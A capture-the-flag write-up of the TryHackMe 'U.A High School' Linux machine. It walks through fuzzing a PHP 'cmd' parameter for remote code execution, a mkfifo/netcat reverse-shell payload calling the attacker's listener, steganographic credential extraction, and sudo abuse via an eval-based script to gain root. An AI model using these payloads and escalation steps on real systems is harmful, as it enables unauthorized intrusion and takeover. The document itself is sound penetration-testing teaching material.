---
layout: post
title: THM U.A High School WriteUp
date: 2025-03-08
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - Web-Fuzzing
  - PHP-RCE
  - Steganography
  - Password-Extraction
  - Linux-Privilege-Escalation
  - Sudoers-Abusing
media_subpath: /assets/img/UA
---
![Desktop View](UA.png){: w="400"  h="400" }



# U.A High School Skills


>**U.A High School** is a easy Linux machine where we will use the following skills:

- **Port Discovery**
- **Web Application Enumeration**
- **Directory and File Fuzzing**
- **Exploiting PHP File for Remote Code Execution (RCE)**
- **Reverse Shell Execution**
- **Steganography for Password Extraction**
- **Linux Privilege Enumeration**
- **Exploiting Misconfigured Sudoers Privilege**
- **Privilege Escalation via Binary Execution**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22** & port **80**:

```perl
❯ nmap -p- -open -sS --min-rate 5000 -vvv -n -Pn 10.10.81.200 -oG allPorts
Nmap scan report for 10.10.81.200
Host is up, received user-set (0.18s latency).
Scanned at 2025-03-07 21:06:50 CET for 16s
Not shown: 65530 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p22,80 10.10.81.200 -oN targeted
Nmap scan report for 10.10.81.200
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have to check the following ports & services:

- **Port 22 --> OpenSSH 8.2p1 Ubuntu 4ubuntu0.7**
- **Port  80 -->  Apache/2.4.41 (Ubuntu)**

Let's start with the **HTTP** service.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.81.200
http://10.10.81.200 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[info@yuei.ac.jp], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.81.200], Title[U.A. High School]
```

Nothing really useful found beside an email, let's take a look inside the website, once inside ***http://10.10.81.200***, we are in front of a high school website.

![Desktop View](UAMainPage.png) 

At first i tried tickling a bit the website features, but much of the them are broken and the few that work are not exploitable, so let's **fuzz** in order to find **subdirectories**.

```bash
❯ gobuster dir -u http://10.10.81.200 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.200
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.81.200/assets/]
/server-status        (Status: 403) [Size: 277]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

We found a directory named `assets`, since we didn't found nothing more and if we access it, nothing is displayed, let's fuzz `/assets`.

```bash
❯ gobuster dir -u http://10.10.81.200/assets -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.200/assets
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 320] [--> http://10.10.81.200/assets/images/]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

Another directory found, `/images`, nothing displayed again if we access it, before fuzzing the new directory (`/images`), let's try fuzzing the `/assets` folder with a filenames wordlist.

```bash
❯ gobuster dir -u http://10.10.81.200/assets -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.200/assets
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.                    (Status: 200) [Size: 0]
/styles.css           (Status: 200) [Size: 2943]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 0]
/.htpasswd            (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/wp-forum.phps        (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
Progress: 11424 / 11425 (99.99%)
===============================================================
Finished
===============================================================
```

Most of the results are `Forbidden (403)`, but we found an `index.php` file, if we access it via browser, nothing is displayed, but since it's a **PHP** file, it may have some vulnerable parameter defined, we can try this by giving the parameter a command injection and fuzzing for the parameter name.

```bash
❯ ffuf -u "http://10.10.81.200/assets/index.php?FUZZ=id" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.81.200/assets/index.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

cmd                     [Status: 200, Size: 72, Words: 1, Lines: 1, Duration: 453ms]
:: Progress: [6453/6453] :: Job [1/1] :: 1030 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

Bingo, we found a `cmd` parameter, that allow us to **RCE**.

Let's try to see if it works.

```bash
❯ curl -s "http://10.10.81.200/assets/index.php?cmd=id" | xargs
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
```

Seems like we get a `base64` coded output, so if we decode it we get the output of the command.

```bash
❯ curl -s "http://10.10.81.200/assets/index.php?cmd=id" | xargs | base64 -d
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can just execute a reverse shell payload, in order to gain a shell, but I have created a basic bash script that give us a shell that decode the `base64` string automatically, you can check it at my [Github](https://github.com/Ne4rBy/RCETranslator) page.

```bash
wget https://raw.githubusercontent.com/Ne4rBy/RCETranslator/refs/heads/main/RCETranslator.sh
```

Once with the tool, you have to change the target URL and it's ready to use.

```bash
❯ ./RCETranslator.sh
    ____  ____________   ______                      __      __            
   / __ \/ ____/ ____/  /_  __/________ _____  _____/ /___ _/ /_____  _____
  / /_/ / /   / __/      / / / ___/ __ `/ __ \/ ___/ / __ `/ __/ __ \/ ___/
 / _, _/ /___/ /___     / / / /  / /_/ / / / (__  ) / /_/ / /_/ /_/ / /    
/_/ |_|\____/_____/    /_/ /_/   \__,_/_/ /_/____/_/\__,_/\__/\____/_/     
                                                                           
Created by: Samuel Laveau (aka Ne4rby)

CMD-> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
CMD-> 
```

Note: ***I know it's a bit useless since we can gain a real shell, but i wanted to practice a bit my bash script***

We can now gain a shell, let's start by setting a listener at port **443**.

```bash
❯ nc -nvlp 443
```

Once with the listener settled, let's execute the following URL-Encoded payload.

```bash
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.14.99.119%20443%20%3E%2Ftmp%2Ff
```

We should have received a shell.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.14.99.119] from (UNKNOWN) [10.10.81.200] 46632
bash: cannot set terminal process group (808): Inappropriate ioctl for device
bash: no job control in this shell
www-data@myheroacademia:/var/www/html/assets$ whoami
www-data
```

---
## Shell as www-data

### TTY Treatment 

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

### Privilege Escalation

Once with a stable shell, we can begin with the **privilege escalation** phase, firstly i checked the website structure, with a bit of research i found a hidden folder at `/var/www/Hidden_Content/passpharse.txt`, checking it's content seems like `base64` string.  

```bash
www-data@myheroacademia:/var/www/Hidden_Content$ cat /var/www/Hidden_Content/passphrase.txt 
QWxsbWlnaHRGb3JFdmVyISEhCg==
```

So, let's decode it.

```bash
www-data@myheroacademia:/var/www/Hidden_Content$ cat /var/www/Hidden_Content/passphrase.txt | base64 -d
All*********ver!!!
```

Bingo, we found what seems like a password, the first thing i thought was authenticate as a system user, but that didn't worked.

```bash
www-data@myheroacademia:/var/www/Hidden_Content$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
deku:x:1000:1000:deku:/home/deku:/bin/bash

www-data@myheroacademia:/var/www/Hidden_Content$ su deku
Password: 
su: Authentication failure
```

After a bit of thinking i remembered that there was two images at the `/images` folder of the website, so let's see if they have any data embed.

In order to do this we have to download the images, so let's host them in the target machine.

```bash
ww-data@myheroacademia:/var/www/html/assets/images$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then download them in out machine.

```bash
❯ wget http://10.10.81.200:8000/yuei.jpg
❯ wget http://10.10.81.200:8000/oneforall.jpg
```

Once with the images let's check if they have any embed data, I started with the `yuei.jpg` file.

```bash
❯ steghide extract -sf yuei.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Nothing, let's see with the `oneforall.jpg` file.

```bash
❯ steghide extract -sf oneforall.jpg
Enter passphrase: **************
steghide: the file format of the file "oneforall.jpg" is not supported.
```

Seems like the magic numbers of this file have been modified, since if we use `file` to detect the file format, it get detected as `data`.

```bash
❯ file oneforall.jpg
oneforall.jpg: data
```

Let's get it back to `jpg`, we can make this manually using `hexeditor`, but i really like this tool made by **Haxrein** that automate the process, you can check it at his repo here: [https://github.com/Haxrein/MagicBytes](https://github.com/Haxrein/MagicBytes).

The use is pretty simple.

```bash
❯ python3 magicbytes.py -i oneforall.jpg -m jpg

|  \/  |           (_)    | ___ \     | | github.com/Haxrein       
| .  . | __ _  __ _ _  ___| |_/ /_   _| |_ ___  ___   _ __  _   _  
| |\/| |/ _` |/ _` | |/ __| ___ \ | | | __/ _ \/ __| | '_ \| | | | 
| |  | | (_| | (_| | | (__| |_/ / |_| | ||  __/\__ \_| |_) | |_| | 
\_|  |_/\__,_|\__, |_|\___\____/ \__, |\__\___||___(_) .__/ \__, | 
               __/ |              __/ |              | |     __/ | 
              |___/              |___/               |_|    |___/

Magic bytes has been changed of oneforall.jpg as jpg
```

If we check once again the file format we can see that it changed to `jpg`.

```bash
❯ file oneforall.jpg
oneforall.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1140x570, components 3
```

So let's check if it has any embed data again.

```bash
❯ steghide extract -sf oneforall.jpg
Enter passphrase: ***************
wrote extracted data to "creds.txt".
```

Bingo, we found a file named `creds.txt` inside the image, let's see what's inside.

```bash
❯ catn creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?Fo****l_!******A
```

There we go, we have found what looks like valid credentials for the system user `deku`.

So, let's log in as `deku`.

```bash
www-data@myheroacademia:/var/www/html/assets/images$ su deku
Password: 
deku@myheroacademia:/var/www/html/assets/images$
```

---
## Shell as deku

Once as user `deku` we can read the `user.txt` flag at `/home/deku/user.txt`.

```bash
deku@myheroacademia:~$ cat /home/deku/user.txt 
THM{************************}
```

Checking the `sudoers` privileges, we found that we can run as `root` a script named `feedback.sh`.

```bash
deku@myheroacademia:~$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

So, let's see what it does.

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

We can see the following line `eval "echo $feedback"`, the eval operator is pretty dangerous since it execute the input as shell commands.

The script has input sanitization, but lacks on filtering the next chars: `>` and `/`, so we can redirect output to other files as `root`.

So, we can for example, give the user `deku` full `sudores` privileges.

```bash
deku@myheroacademia:~$ /opt/NewComponent/./feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudores
It is This:
/opt/NewComponent/./feedback.sh: line 14: /etc/sudores: Permission denied
Feedback successfully saved.
```

Seems successful since the `It is This:` field is empty, let's check again the `sudoers` privileges of `deku`.

```bash
deku@myheroacademia:~$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL
```

There we go, now we can gain a shell as `root`.

```bash
deku@myheroacademia:~$ sudo su
root@myheroacademia:/home/deku# whoami
root
```

Now you can read the `root.txt` flag at `/root/root.txt`.

```bash
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{************************}
```

## Final Thoughts

The **U.A High School** machine offers a well-rounded challenge that emphasizes **web fuzzing**, **steganography**, and **Linux privilege escalation**. The initial phase involves extensive **directory and file fuzzing** to uncover a vulnerable PHP file, which allows for **Remote Code Execution (RCE)** and provides an initial foothold on the system. This highlights the importance of thorough enumeration and the risks associated with leaving vulnerable files exposed on web servers. The next step involves using **steganography** to extract a hidden password from an image, showcasing the creative ways sensitive information can be concealed and discovered. Finally, privilege escalation is achieved by exploiting a **misconfigured sudoers permission**, allowing the user to execute a specific binary with elevated privileges. This machine effectively reinforces key skills in **web exploitation**, **steganography**, and **privilege escalation**, making it a valuable and engaging exercise for those looking to strengthen their penetration testing capabilities.

![Desktop View](UAPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

